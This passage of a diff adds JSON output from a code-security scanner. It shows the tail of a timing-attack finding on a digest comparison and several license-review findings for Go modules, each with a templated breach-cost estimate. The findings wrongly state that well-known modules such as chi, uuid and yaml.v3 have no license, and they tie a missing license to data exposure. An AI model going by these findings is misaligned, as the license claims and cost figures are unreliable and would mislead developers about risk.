+      "calibration_reason": "no-history",
+      "verifier_verdict": "cannot-verify",
+      "verifier_reason": "no-poc-no-sanitizer-rule",
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0,
+      "crownJewelTier": "unknown",
+      "crownJewelFactors": [],
+      "cloneClusterId": null,
+      "cloneClusterSize": 1,
+      "provenance": "human-likely",
+      "provenanceScore": 0,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:medium"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "script-kiddie",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "script-kiddie",
+      "personaMaxScore": 0.4,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/timing-attack",
+        "ruleId": "CWE-208",
+        "parser": "COMPARISON",
+        "evidence": {
+          "sinkSnippet": "if req.LastDigest == digest {",
+          "sourceSnippet": null,
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "unknown",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/go-chi/chi/v5@5.3.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/go-chi/chi/v5@5.3.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/go-chi/chi/v5@5.3.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/google/uuid@1.6.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/google/uuid@1.6.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/google/uuid@1.6.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/jackc/pgx/v5@5.9.2:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/jackc/pgx/v5@5.9.2 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/jackc/pgx/v5@5.9.2 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:gopkg.in/yaml.v3@3.0.1:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: gopkg.in/yaml.v3@3.0.1 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: gopkg.in/yaml.v3@3.0.1 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/jackc/pgpassfile@1.0.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/jackc/pgpassfile@1.0.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/jackc/pgpassfile@1.0.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/jackc/pgservicefile@0.0.0:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/jackc/pgservicefile@0.0.0 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/jackc/pgservicefile@0.0.0 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": null,
+      "crownJewelTier": null,
+      "crownJewelFactors": null,
+      "cloneClusterId": null,
+      "cloneClusterSize": null,
+      "provenance": null,
+      "provenanceScore": null,
+      "typeNarrowed": null,
+      "strideCategory": null,
+      "personaScores": null,
+      "personaTopTwo": null,
+      "personaMaxName": null,
+      "personaMaxScore": null,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": null,
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    },
+    {
+      "id": "license-graph:golang:github.com/jackc/puddle/v2@2.2.2:unknown:review",
+      "kind": "license",
+      "severity": "low",
+      "vuln": "License-review-needed: github.com/jackc/puddle/v2@2.2.2 (no license) under saas distribution mode",
+      "cwe": null,
+      "owaspLlm": null,
+      "stride": null,
+      "file": "go.mod",
+      "line": 0,
+      "snippet": "",
+      "fix": null,
+      "reachable": null,
+      "triage": null,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": null,
+      "corroborationCount": null,
+      "corroboration": null,
+      "multiSignal": null,
+      "proof": null,
+      "provablySafe": null,
+      "toxicity": null,
+      "toxicityFactors": null,
+      "toxicityLabel": null,
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "License-review-needed: github.com/jackc/puddle/v2@2.2.2 (no license) under saas distribution mode on `go.mod:0` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "stableId": null,
+      "confidenceTier": null,
+      "exploitability": null,
+      "exploitabilityTier": null,
+      "exploitabilityFactors": null,
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": null,
+      "llm_confidence": null,
+      "unvalidated": false,
+      "cross_language": false,
+      "family": "license-graph",
+      "parser": null,
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": null,
+      "verifier_verdict": null,
+      "verifier_reason": null,
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": null,
+      "mitigationsApplied": null,
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": false,
+      "coldPath": false,
+      "hotPath": false,
